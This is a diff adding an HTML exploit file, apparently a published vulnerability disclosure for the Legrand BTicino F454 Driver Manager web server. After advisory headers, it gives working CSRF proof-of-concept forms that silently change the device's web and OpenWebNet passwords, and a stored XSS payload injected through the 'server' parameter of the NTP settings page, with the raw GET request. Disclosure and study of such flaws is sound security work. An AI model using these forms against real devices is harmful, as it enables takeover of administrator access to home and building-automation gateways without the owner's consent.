@@ -1,0 +1,118 @@
+<!--
+
+Legrand BTicino Driver Manager F454 1.0.51 CSRF Change Password Exploit
+
+
+Vendor: BTicino S.p.A.
+Product web page: https://www.bticino.com
+
+Affected version: Hardware Platform: F454
+                  Firmware version: 1.0.51
+                  Driver Manager version: 1.1.14
+
+Summary: Audio/video web server for the remote control of the
+system using web pages or the MY HOME portal. The device can
+operate as a gateway for the use of the MHVisual and Virtual
+Configurator software - 6 DIN modules. It replaces item F453
+and F453AV.
+
+Desc: The application interface allows users to perform certain
+actions via HTTP requests without performing any validity checks
+to verify the requests. This can be exploited to perform certain
+actions with administrative privileges if a logged-in user visits
+a malicious web site.
+
+Tested on: Apache/2.2.14 (Unix)
+           OpenSSL/1.0.0d
+           PHP/5.1.6
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                                  @zeroscience
+
+
+Advisory ID: ZSL-2019-5521
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5521.php
+
+30.04.2019
+
+-->
+
+
+<!-- CSRF PoC web access password change -->
+<html>
+  <body>
+    <form action="http://192.168.1.66:8080/system/password.save.php" method="POST">
+      <input type="hidden" name="password1" value="newpass123" />
+      <input type="hidden" name="password2" value="newpass123" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+<!-- CSRF PoC OpenWebNet password change -->
+<html>
+  <body>
+    <form action="http://192.168.1.66:8080/system/ownpassword.save.php" method="POST">
+      <input type="hidden" name="ownpassword" value="ilegnisi" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+<!--
+
+Legrand BTicino Driver Manager F454 1.0.51 Authenticated Stored XSS Exploit
+
+
+Vendor: BTicino S.p.A.
+Product web page: https://www.bticino.com
+
+Affected version: Hardware Platform: F454
+                  Firmware version: 1.0.51
+                  Driver Manager version: 1.1.14
+
+Summary: Audio/video web server for the remote control of the
+system using web pages or the MY HOME portal. The device can
+operate as a gateway for the use of the MHVisual and Virtual
+Configurator software - 6 DIN modules. It replaces item F453
+and F453AV.
+
+Desc: The application suffers from an authenticated stored XSS
+via GET request. The issue is triggered when input passed via
+the GET parameter 'server' is not properly sanitized before
+being returned to the user. This can be exploited to execute
+arbitrary HTML and script code in a user's browser session in
+context of an affected site.
+
+Tested on: Apache/2.2.14 (Unix)
+           OpenSSL/1.0.0d
+           PHP/5.1.6
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                                  @zeroscience
+
+
+Advisory ID: ZSL-2019-5522
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5522.php
+
+30.04.2019
+
+-->
+
+
+<!-- Stored XSS via GET request -->
+<html>
+  <body>
+    <form action="http://192.168.1.66:8080/system/time.ntp.php">
+      <input type="hidden" name="mode" value="mine" />
+      <input type="hidden" name="server" value='"><marquee>Waddup.</marquee>' />
+      <input type="submit" value="Signal" />
+    </form>
+  </body>
+</html>
+
+<!-- GET http://192.168.1.66:8080/system/time.ntp.php?mode=mine&server="><marquee>Waddup.</marquee> HTTP/1.1 -->
